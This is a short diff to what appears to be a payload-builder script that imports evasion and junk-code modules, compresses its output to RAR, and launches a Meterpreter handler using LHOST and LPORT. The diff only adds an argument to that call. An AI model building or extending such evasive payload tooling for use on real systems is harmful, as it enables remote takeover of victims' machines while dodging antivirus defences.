@@ -1,6 +1,7 @@
 from lib import evasion, core, gen, junkcode
 
 
+
 def Construction():
 
     ARCH = "x64"
@@ -46,7 +47,7 @@ def Construction():
 
         gen.Compress_Rar(FILENAME)
 
-        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
+        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)
 
         print(core.amcolors.GREEN + core.amcolors.BOLD + "\n [+] Complete task." + core.amcolors.ENDC)
         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Exiting script." + core.amcolors.ENDC)
